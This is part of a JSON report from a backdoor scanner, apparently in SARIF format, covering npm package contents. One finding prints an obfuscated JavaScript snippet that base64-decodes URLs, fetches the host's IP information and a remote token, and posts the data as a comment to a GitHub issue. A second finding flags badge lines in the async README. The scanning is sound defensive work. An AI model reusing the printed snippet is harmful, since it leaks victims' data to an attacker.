                      "text": " let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L2lzc3Vlcy80L2NvbW1lbnRz\\n\".trim(), \"base64\").toString(\"ascii\"), method: \"POST\", headers: { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135",
                      "markdown": "` let a = await fetchIpInfo(new Buffer.from(\"aHR0cHM6Ly9pZmNvbmZpZy5jby9qc29u\\n\".trim(), \"base64\").toString(\"ascii\")), b = await fetchToken(new Buffer.from(\"aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NpbXBsZWxpdmUx\\nMi9zaW1wbGUvbWFzdGVyL2s=\\n\".trim(), \"base64\").toString(\"ascii\")); await comment({ hostname: \"api.github.com\", port: 443, path: new Buffer.from(\"L3JlcG9zL2g0cHB5bDF2ZS9jb2xsZWN0L2lzc3Vlcy80L2NvbW1lbnRz\\n\".trim(), \"base64\").toString(\"ascii\"), method: \"POST\", headers: { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/tmp/dataset3/js/npm-async-3.2.5-r1.apk/npm-async-3.2.5-r1/usr/local/lib/node_modules/async/README.md"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 16,
                  "endLine": 6,
                  "endColumn": 20,
                  "snippet": {
                    "text": "com/caolan/async/actions/workflows/ci.yml/badge.svg)\n[![NPM version](https://img.shields.io/npm/v/async.svg)](https://www.npmjs.com/package/async)\n[![Coverage Status](https://coveralls.io/repos/caolan/async/badge.svg?branch=master)](https://coveralls.io/r/caolan/async?branch=master)\n[![Join the chat at https://gitter.im/caolan/async](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/caolan/async?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n[![jsDelivr Hits](https://data.jsdelivr.com/v1/package/npm/async/badge?style=rounded)](https://www.jsdelivr.com/package",
                    "rendered": {
                      "text": "com/caolan/async/actions/workflows/ci.yml/badge.svg)\n[![NPM version](https://img.shields.io/npm/v/async.svg)](https://www.npmjs.com/package/async)\n[![Coverage Status](https://coveralls.io/repos/caolan/async/badge.svg?branch=master)](https://coveralls.io/r/caolan/async?branch=master)\n[![Join the chat at https://gitter.im/caolan/async](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/caolan/async?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n[![jsDelivr Hits](https://data.jsdelivr.com/v1/package/npm/async/badge?style=rounded)](https://www.jsdelivr.com/package",
                      "markdown": "`com/caolan/async/actions/workflows/ci.yml/badge.svg)\n[![NPM version](https://img.shields.io/npm/v/async.svg)](https://www.npmjs.com/package/async)\n[![Coverage Status](https://coveralls.io/repos/caolan/async/badge.svg?branch=master)](https://coveralls.io/r/caolan/async?branch=master)\n[![Join the chat at https://gitter.im/caolan/async](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/caolan/async?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n[![jsDelivr Hits](https://data.jsdelivr.com/v1/package/npm/async/badge?style=rounded)](https://www.jsdelivr.com/package`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}